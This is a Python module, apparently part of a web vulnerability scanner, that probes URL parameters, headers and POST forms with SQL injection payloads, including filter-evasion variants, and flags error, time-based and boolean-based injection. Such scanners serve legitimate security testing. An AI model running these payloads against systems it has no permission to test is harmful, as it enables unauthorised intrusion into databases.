import requests
import time
import logging
import random
import string
import json
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote_plus
from copy import deepcopy

# --- Enhanced Payloads (Examples) ---
# Grouping by technique/evasion might be better
SQLI_PAYLOADS = {
    "Generic_Error": [
        "'", "\"", "\'`", # Basic quotes
        "' OR '1'='1", "1' ORDER BY 1-- ", "1' ORDER BY 100-- ",
        "' UNION SELECT null -- ",
    ],
    "Generic_Union": [
        "' UNION SELECT @@version -- ",
        "' UNION SELECT NULL, @@version -- ",
        "' UNION SELECT NULL, NULL, @@version -- "
    ],
    "Generic_Time": [
        "' OR SLEEP(5) -- ", "1 AND SLEEP(5) #", "'; WAITFOR DELAY '0:0:5' -- ",
        "' || pg_sleep(5) || '" # PostgreSQL specific string concat
    ],
    "Generic_Boolean": [
        # True conditions
        (" AND 1=1", " AND 1=2"), # Basic boolean
        (" OR 1=1 -- ", " OR 1=2 -- "),
        (" AND 'a'='a'", " AND 'a'='b'"),
        # False conditions (paired with above)
    ],
    "Evasion_Comments": [
        "'/**/OR/**/'1'='1'",
        "' UNI/**/ON SEL/**/ECT NULL -- ",
        "1' ORDER BY 1#",
        "--' OR 1=1 -- "
    ],
    "Evasion_Case": [
        "' uNiOn sElEcT nUlL -- ",
        "' oR SlEeP(5) -- "
    ],
    "Evasion_Encoding": [
        "%27 OR 1=1 -- ", # URL Encoded single quote
        "' UNION SELECT CHAR(110)%2BCHAR(117)%2BCHAR(108)%2BCHAR(108) -- " # Basic Char encoding (NULL)
    ],
    "DbSpecific_Error": [
        "' AND ExtractValue(1, CONCAT(0x5c, (SELECT user()))) -- ", # MySQL Error
        "convert(int, (select 1/0)) -- ", # MSSQL Error
        "CAST(FLOOR(1/0) AS numeric) -- ", # PostgreSQL Error
    ],
    "DbSpecific_Time": [
        "' + IF(1=1, SLEEP(5), 0) + '", # MySQL Time
        "1; SELECT pg_sleep(5) -- ", # PostgreSQL Time
        "%3BWAITFOR DELAY '0:0:5'--", # MSSQL Time (URL encoded)
        "' AND BENCHMARK(5000000,MD5('1')) -- ", # MySQL CPU Heavy
    ]
}

# More comprehensive error signs
ERROR_SIGNS = [
    "sql syntax near", "syntax error", "unclosed quotation mark", "unterminated string",
    "incorrect syntax", "invalid query", "sql error", "database error", "conversion failed",
    "you have an error in your sql syntax", "warning: mysql", "unknown column", "mysql_fetch_array",
    "illegal mix of collations", "procedure analyse",
    "error: syntax error at or near", "psql:", "pg_query", "invalid input syntax for type",
    "unterminated quoted identifier", "pg_num_rows() expects",
    "unclosed quotation mark after the character string", "microsoft ole db provider for odbc drivers error",
    "microsoft ole db provider for sql server", "sql server detected a logical consistency-based i/o error",
    "incorrect syntax near", "server error in '/ ' application", "invalid object name", "sql command not properly ended",
    "ora-01756", "ora-00933", "ora-00927", "quoted string not properly terminated", "missing expression"
]

# Parameters/Headers to test
COMMON_URL_PARAMS = ['id', 'item', 'page', 'file', 'query', 'search', 'param', 'test', 'select', 'view', 'cat', 'dir', 'action', 'val', 'keyword']
COMMON_HEADERS = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Client-IP', 'X-Real-IP', 'Forwarded', 'Authorization', 'Accept-Language']
# Note: Testing Authorization might log out sessions if not done carefully.

TIME_DELAY = 5
DELAY_THRESHOLD_MULTIPLIER = 0.8
BOOLEAN_TEST_MIN_DIFF_RATIO = 0.05 # Min difference ratio for boolean content checks

# --- Helper Function for Boolean Comparison ---
def compare_responses(resp_true, resp_false, verbose=False):
    """Compare two responses to detect differences for boolean-based SQLi."""
    if resp_true is None or resp_false is None:
        return False # Cannot compare
    
    # Basic checks first
    if resp_true.status_code != resp_false.status_code:
        if verbose: logging.debug(f"Boolean Check: Status codes differ ({resp_true.status_code} vs {resp_false.status_code})")
        return True
    
    # Compare content lengths (simple but effective sometimes)
    len_true = len(resp_true.text)
    len_false = len(resp_false.text)
    if len_true == 0 and len_false > 0: # Handle empty response case
        if verbose: logging.debug(f"Boolean Check: Content length differs significantly (0 vs {len_false})")
        return True
    if len_true > 0: # Avoid division by zero
        diff_ratio = abs(len_true - len_false) / len_true
        if diff_ratio > BOOLEAN_TEST_MIN_DIFF_RATIO:
             if verbose: logging.debug(f"Boolean Check: Content length differs significantly ({len_true} vs {len_false}, Ratio: {diff_ratio:.2f})")
             return True
             
    # Add more sophisticated checks? (e.g., diffing text, specific keyword presence/absence)
    # Be cautious of dynamic content (timestamps, CSRF tokens)
    # Simple check: does one contain an error the other doesn't?
    true_has_error = any(err in resp_true.text.lower() for err in ERROR_SIGNS)
    false_has_error = any(err in resp_false.text.lower() for err in ERROR_SIGNS)
    if true_has_error != false_has_error:
         if verbose: logging.debug(f"Boolean Check: Error presence differs ({true_has_error} vs {false_has_error})")
         return True

    return False # No significant difference detected

# --- Main Check Function --- 
def check(session, url, soup, response, config):
    """
    Advanced SQL Injection check:
    - Tests URL params, common headers, form params, basic JSON body values.
    - Uses wider payloads + basic evasion.
    - Detects error-based, time-based, and basic boolean-based blind SQLi.
    """
    findings = []
    processed_evidence = set() # Track evidence to reduce duplicates
    verbose = config.get('verbose', False)
    timeout = config.get('timeout', 10)
    base_url = url.split('?')[0]
    original_headers = response.request.headers # Headers used for the *request* that got this response

    # --- 1. Baseline Time --- 
    baseline_time = None
    try:
         start_time = time.time()
         session.get(url, timeout=timeout, allow_redirects=True, headers=original_headers)
         baseline_time = time.time() - start_time
         if verbose: logging.debug(f"SQLi Baseline: {baseline_time:.2f}s for {url}")
    except requests.exceptions.RequestException as e:
         logging.warning(f"SQLi: Could not measure baseline time for {url}: {e}")

    # --- 2. Prepare Injection Points --- 
    injection_points = [] # List of dicts: {'location': 'url/header/form/json', 'param_name': 'x', 'original_value': 'y'}

    # a) URL Parameters
    parsed_url = urlparse(url)
    url_params = parse_qs(parsed_url.query)
    url_params_to_test = set(url_params.keys()) | set(COMMON_URL_PARAMS)
    for name in url_params_to_test:
        injection_points.append({
            'location': 'url',
            'param_name': name,
            'original_value': url_params.get(name, ['1'])[0]
        })

    # b) HTTP Headers
    for name in COMMON_HEADERS:
         injection_points.append({
            'location': 'header',
            'param_name': name,
            'original_value': original_headers.get(name, 'TestValue')
        })

    # c) Form Parameters (if soup available)
    if soup:
        for form in soup.find_all('form'):
            form_method = form.get('method', 'get').lower()
            # Focus on POST forms for body injection, GET params handled by URL checks
            if form_method == 'post':
                 for input_tag in form.find_all(['input', 'textarea', 'select']):
                     name = input_tag.get('name')
                     if name: # Only test named inputs
                         # Simple default value, real tool might need better defaults
                         original_value = input_tag.get('value', 'TestValue') 
                         if input_tag.name == 'textarea':
                             original_value = input_tag.text
                         elif input_tag.name == 'select':
                              option = input_tag.find('option', selected=True) or input_tag.find('option')
                              if option:
                                   original_value = option.get('value', option.text)
                         
                         injection_points.append({
                             'location': 'form', 
                             'param_name': name, 
                             'original_value': original_value,
                             'form_action': urljoin(url, form.get('action', '') or url), # Resolve action URL
                             'form_method': 'post' 
                         })

    # d) JSON Body (Basic - if applicable)
    content_type = original_headers.get('Content-Type', '').lower()
    # This part is tricky - we don't usually have the original request body here.
    # We could make assumptions or require more context.
    # For now, let's skip direct JSON body injection in this context.
    # If a common param name matches a URL param, we test it there.
    if 'application/json' in content_type:
         if verbose: logging.debug("SQLi: Request content-type is JSON, but body injection isn't implemented in this check.")

    # --- 3. Flatten Payloads --- 
    all_payloads = [] 
    boolean_payload_pairs = []
    for key, payloads in SQLI_PAYLOADS.items():
        if key == "Generic_Boolean":
            boolean_payload_pairs.extend(payloads)
        else:
            all_payloads.extend(payloads)
    # Reduce payload set for speed? Example: random sample
    # payload_sample = random.sample(all_payloads, min(len(all_payloads), 50)) + random.sample(boolean_payload_pairs, min(len(boolean_payload_pairs), 10))
    payload_sample = all_payloads # Use all for now

    # --- 4. Test Each Injection Point --- 
    logging.info(f"SQLi: Testing {len(injection_points)} potential injection points...")
    for point in injection_points:
        location = point['location']
        param_name = point['param_name']
        original_value = point['original_value']
        if verbose: logging.debug(f"SQLi: Testing {location} parameter '{param_name}'")

        # Test Error/Time based payloads first
        for payload in payload_sample:
            test_value = str(original_value) + payload # Ensure string concatenation
            evidence_key = f"{location}:{param_name}:{payload[:20]}" # Simple key for deduplication
            if evidence_key in processed_evidence: continue

            resp = None
            start_time = time.time()
            try:
                if location == 'url':
                    test_params = url_params.copy()
                    test_params[param_name] = [test_value]
                    test_url_parts = list(parsed_url)
                    test_url_parts[4] = urlencode(test_params, doseq=True)
                    test_url = urlunparse(test_url_parts)
                    resp = session.get(test_url, timeout=timeout + TIME_DELAY + 2, allow_redirects=True, headers=original_headers)
                
                elif location == 'header':
                    test_headers = original_headers.copy()
                    test_headers[param_name] = test_value
                    resp = session.get(url, timeout=timeout + TIME_DELAY + 2, allow_redirects=True, headers=test_headers)
                
                elif location == 'form':
                    # Need to reconstruct form data
                    form_data = { p['param_name']: p['original_value'] for p in injection_points if p.get('form_action') == point.get('form_action') } 
                    form_data[param_name] = test_value # Inject payload
                    resp = session.post(point['form_action'], data=form_data, timeout=timeout + TIME_DELAY + 2, allow_redirects=True, headers=original_headers)
                
                # JSON location skipped for now

                response_time = time.time() - start_time
                if resp is None: continue # Skip if request wasn't made for this location

                # Check for errors
                resp_text_lower = resp.text.lower()
                error_found = False
                for error_sign in ERROR_SIGNS:
                    if error_sign in resp_text_lower:
                        logging.warning(f"Potential SQLi (Error Based): Found '{error_sign}' in {location} param '{param_name}' (Payload: {payload})")
                        sev = "High" if "syntax" in error_sign or "unclosed" in error_sign else "Medium" # Basic severity guess
                        findings.append({
                            "name": f"SQL Injection (Error Based - {location.capitalize()})",
                            "severity": sev,
                            "description": f"Database error message '{error_sign}' reflected in response for {location} parameter '{param_name}'.",
                            "evidence": {"location": location, "parameter": param_name, "payload": payload, "error_snippet": error_sign},
                            "recommendation": "Use parameterized queries/prepared statements. Validate/sanitize input."
                        })
                        processed_evidence.add(evidence_key)
                        error_found = True
                        break
                
                if error_found: continue # Don't time check if error found

                # Check for time delays
                is_time_payload = "sleep" in payload.lower() or "waitfor" in payload.lower() or "benchmark" in payload.lower()
                if baseline_time is not None and is_time_payload:
                    required_delay = TIME_DELAY * DELAY_THRESHOLD_MULTIPLIER
                    if response_time > (baseline_time + required_delay):
                        logging.warning(f"Potential SQLi (Time Based): Delay detected in {location} param '{param_name}' (Payload: {payload})")
                        findings.append({
                            "name": f"SQL Injection (Time Based - {location.capitalize()})",
                            "severity": "High",
                            "description": f"Server response took significantly longer ({response_time:.2f}s vs baseline {baseline_time:.2f}s) for {location} parameter '{param_name}', suggesting blind SQLi.",
                            "evidence": {"location": location, "parameter": param_name, "payload": payload, "response_time_s": response_time, "baseline_time_s": baseline_time},
                            "recommendation": "Use parameterized queries/prepared statements. Avoid dynamic SQL. Validate/sanitize input."
                        })
                        processed_evidence.add(evidence_key)

            except requests.exceptions.Timeout:
                 if verbose: logging.debug(f"SQLi: Timeout testing {location}/{param_name} (Payload: {payload})")
            except requests.exceptions.RequestException as e:
                 if verbose: logging.debug(f"SQLi: Request error testing {location}/{param_name} (Payload: {payload}): {e}")
            except Exception as e:
                logging.error(f"SQLi: Unexpected error testing {location}/{param_name} (Payload: {payload}): {e}", exc_info=verbose)

        # Test Boolean-based payloads
        for true_payload, false_payload in boolean_payload_pairs:
             resp_true, resp_false = None, None
             evidence_key_base = f"{location}:{param_name}:{true_payload[:10]}:{false_payload[:10]}"
             if evidence_key_base + "_bool" in processed_evidence: continue

             try:
                 # Send TRUE request
                 test_value_true = str(original_value) + true_payload
                 if location == 'url':
                     test_params = url_params.copy(); test_params[param_name] = [test_value_true]
                     test_url_parts = list(parsed_url); test_url_parts[4] = urlencode(test_params, doseq=True)
                     test_url_true = urlunparse(test_url_parts)
                     resp_true = session.get(test_url_true, timeout=timeout, allow_redirects=True, headers=original_headers)
                 elif location == 'header':
                     test_headers = original_headers.copy(); test_headers[param_name] = test_value_true
                     resp_true = session.get(url, timeout=timeout, allow_redirects=True, headers=test_headers)
                 elif location == 'form':
                     form_data = { p['param_name']: p['original_value'] for p in injection_points if p.get('form_action') == point.get('form_action') }
                     form_data[param_name] = test_value_true
                     resp_true = session.post(point['form_action'], data=form_data, timeout=timeout, allow_redirects=True, headers=original_headers)
                 
                 # Send FALSE request
                 test_value_false = str(original_value) + false_payload
                 if location == 'url':
                     test_params = url_params.copy(); test_params[param_name] = [test_value_false]
                     test_url_parts = list(parsed_url); test_url_parts[4] = urlencode(test_params, doseq=True)
                     test_url_false = urlunparse(test_url_parts)
                     resp_false = session.get(test_url_false, timeout=timeout, allow_redirects=True, headers=original_headers)
                 elif location == 'header':
                     test_headers = original_headers.copy(); test_headers[param_name] = test_value_false
                     resp_false = session.get(url, timeout=timeout, allow_redirects=True, headers=test_headers)
                 elif location == 'form':
                     form_data = { p['param_name']: p['original_value'] for p in injection_points if p.get('form_action') == point.get('form_action') }
                     form_data[param_name] = test_value_false
                     resp_false = session.post(point['form_action'], data=form_data, timeout=timeout, allow_redirects=True, headers=original_headers)
                 
                 # Compare responses
                 if compare_responses(resp_true, resp_false, verbose):
                     logging.warning(f"Potential SQLi (Boolean Based): Difference detected in {location} param '{param_name}' (Payloads: {true_payload} / {false_payload})")
                     findings.append({
                        "name": f"SQL Injection (Boolean Based - {location.capitalize()})",
                        "severity": "Medium", # Boolean needs verification, less certain than error/time
                        "description": f"Responses differed significantly when injecting TRUE ({true_payload}) vs FALSE ({false_payload}) conditions into {location} parameter '{param_name}', suggesting blind SQLi.",
                        "evidence": {"location": location, "parameter": param_name, "true_payload": true_payload, "false_payload": false_payload, "diff_details": "Status code or content length differed"}, # Add more diff detail?
                        "recommendation": "Use parameterized queries/prepared statements. Validate/sanitize input. Manually verify finding."
                    })
                     processed_evidence.add(evidence_key_base + "_bool")

             except requests.exceptions.RequestException as e:
                  if verbose: logging.debug(f"SQLi: Request error during boolean test for {location}/{param_name}: {e}")
             except Exception as e:
                 logging.error(f"SQLi: Unexpected error during boolean test for {location}/{param_name}: {e}", exc_info=verbose)

    # Final deduplication (optional, based on key evidence fields)
    final_findings = []
    seen_evidence = set()
    for f in findings:
        # Create a tuple of key evidence items to check for uniqueness
        evidence_tuple = (f.get('name'), f['evidence'].get('location'), f['evidence'].get('parameter'))
        if evidence_tuple not in seen_evidence:
            final_findings.append(f)
            seen_evidence.add(evidence_tuple)
            
    return final_findings
